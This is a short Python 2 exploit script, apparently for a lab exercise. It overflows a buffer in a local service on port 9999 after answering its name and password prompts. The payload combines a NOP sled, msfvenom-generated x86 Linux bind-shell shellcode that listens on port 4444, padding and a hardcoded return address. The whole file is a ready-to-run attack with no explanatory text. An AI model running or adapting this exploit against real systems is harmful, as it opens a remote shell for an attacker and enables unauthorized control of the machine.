#!/usr/bin/python

import sys
import socket

# Offset Padding 
payload = "\x42" * 4

# Nop Sled
payload += "\x90" * 600

# Generated by Command:
# msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp lhost=127.0.0.1 lport=4444 -b "\x00\x20" -f python -v payload
payload += "\xba\x96\x49\xd5\x46\xdb\xd7\xd9\x74\x24\xf4\x58"
payload += "\x2b\xc9\xb1\x14\x83\xc0\x04\x31\x50\x10\x03\x50"
payload += "\x10\x74\xbc\xe4\x9d\x8f\xdc\x54\x61\x3c\x49\x59"
payload += "\xec\x23\x3d\x3b\x23\x23\x65\x9a\xe9\x4b\x98\x22"
payload += "\x1f\xd7\xf6\x32\x4e\xb7\x8f\xd2\x1a\x51\xc8\xd9"
payload += "\x5b\x14\xa9\xe5\xe8\x22\x9a\x80\xc3\xaa\x99\xfc"
payload += "\xba\x67\x9d\x6e\x1b\x1d\xa1\xc8\x51\x61\x94\x91"
payload += "\x91\x09\x08\x4d\x11\xa1\x3e\xbe\xb7\x58\xd1\x49"
payload += "\xd4\xca\x7e\xc3\xfa\x5a\x8b\x1e\x7c"

# Padding
payload += "\x41" * (1548 - len(payload))

# Return Address
payload += "\xAC\xC4\xFF\xFF"

# Post-Payload garbage
payload += "\x46" * 8

print "Creating socket..."
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(("127.0.0.1", 9999))

print "Receiving banner and first name prompt..."
print "Received: " + server.recv(1024)	
print "Sending first name..."	
server.send("Cord")	
print "Receiving Last Name prompt..."
print "Received: " + server.recv(1024)
print "Sending last name..."
server.send("LaBarre")	
print "Receiving password prompt..."
print "Received: " + server.recv(1024)
print "Sending exploit..."
server.send(payload)
server.close() 

print "Exploit Sent!"